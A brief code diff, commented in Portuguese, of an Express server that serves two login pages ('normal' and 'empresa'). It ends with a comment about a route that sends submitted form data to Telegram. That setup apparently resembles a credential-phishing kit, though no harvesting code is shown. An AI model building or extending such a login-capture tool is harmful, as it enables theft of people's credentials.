@@ -22,9 +22,9 @@ app.get('/login-empresa', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'loginempresa.html'));
 });
 
-// Rota raiz - opcional: pode servir uma página inicial
+// Rota raiz - serve a página de login normal
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'loginormal.html')); // Ou uma página inicial
+  res.sendFile(path.join(__dirname, 'public', 'loginormal.html'));
 });
 
 // Rota para receber os dados do formulário e enviar para o Telegram
